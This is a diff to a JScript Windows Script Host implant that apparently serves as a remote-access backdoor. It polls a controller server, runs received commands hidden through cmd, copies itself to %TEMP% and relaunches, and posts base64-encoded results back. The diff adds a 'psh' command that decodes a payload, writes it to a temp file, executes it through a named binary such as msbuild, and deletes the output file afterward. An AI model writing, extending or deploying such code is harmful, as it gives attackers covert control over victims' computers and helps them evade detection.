@@ -67,29 +67,40 @@ function post(home, response) {
   return res;
 }
 
-function streamStringToBinary(data) {
-  var inputStream = WScript.CreateObject("ADODB.Stream");
-  inputStream.Type = 2;
-  inputStream.CharSet = "us-ascii";
-  inputStream.Open();
-  inputStream.WriteText(data);
-
-  //Change stream to binary
-  inputStream.Position = 0;
-  inputStream.Type = 1;
-  inputStream.Position = 0;
-
-  var streamData = inputStream.Read();
-  inputStream.Close();
-  return streamData;
+function str2bin(data) {
+   var istream = WScript.CreateObject("ADODB.Stream");
+   istream.Type = 2
+   istream.CharSet = "us-ascii"
+   istream.Open()
+   istream.WriteText(data)
+   istream.Position = 0
+   istream.Type = 1
+   return istream.Read()
+}
+function b64e(data) {
+   var xml = WScript.CreateObject("MSXml2.DOMDocument");
+   var element = xml.createElement("Base64Data");
+   element.dataType = "bin.base64";
+   element.nodeTypedValue = str2bin(data);
+   return element.text.replace(/\n/g, "");
 }
 
-function b64(data) {
+function bin2str(data) {
+  var istream = WScript.CreateObject("ADODB.Stream")
+  istream.Type = 1
+  istream.Open()
+  istream.Write(data)
+  istream.Position = 0
+  istream.Type = 2
+  istream.CharSet = "us-ascii"
+  return istream.ReadText()
+}
+function b64d(data) {
   var xml = WScript.CreateObject("MSXml2.DOMDocument");
   var element = xml.createElement("Base64Data");
-  element.dataType = "bin.base64";
-  element.nodeTypedValue = streamStringToBinary(data);
-  return element.text.replace(/\n/g, "");
+  element.dataType = "bin.base64"
+  element.text = data
+  return bin2str(element.nodeTypedValue)
 }
 
 //Main
@@ -113,7 +124,7 @@ while(true)
 		    WScript.Quit(1);
 	    }
 
-	  //spawn: writes js to %TEMP%
+	    //spawn: writes js to %TEMP%
 	    if(jsObject.cmnd == "spawn") {
 		    fd = fso.CreateTextFile(temp+"\\"+id+".js")
 		    fd.WriteLine(selfdata)
@@ -121,6 +132,26 @@ while(true)
 		    runner.Run(temp+"\\"+id+".js")
 		    retval = "[+] Spawn success..."
 	    }
+
+      //psh runs ... you know what
+      //duplicate code here and cmnd... :(
+      if(jsObject.cmnd.split(" ")[0] == "psh") {
+         fd = fso.CreateTextFile(temp + "\\" + id + ".txt")
+         msb = jsObject.cmnd.split(" ")[1]
+         msbdata = b64d(jsObject.cmnd.split(" ")[2])
+         fd.WriteLine(msbdata)
+         fd.close()
+         runner.Run(cs +" /q /c " + msb + " " + temp + "\\" + id + ".txt" + " 1> " + temp + "\\__" + id + ".txt" + " 2>&1", 0, true)
+		     if(fso.FileExists(temp + "\\__" + id + ".txt")) {
+		       fd = fso.OpenTextFile(temp + "\\__" + id + ".txt")
+	         retval = fd.ReadAll()
+		       fd.close()
+		       fso.DeleteFile(temp + "\\__" + id + ".txt", true)
+		     }
+		     else {
+		       retval = "[!] Error getting output"
+	       }
+      }
 
 	    //credit to nate and 0sum <3
 	    else {
@@ -135,7 +166,7 @@ while(true)
 		      retval = "[!] Error getting output"
 	      }
       }
-      var resp = '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","retval":"'+b64(retval)+'"}';
+      var resp = '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","retval":"'+b64e(retval)+'"}';
       jsObject.cmnd = ""
       post(home, resp)
     }
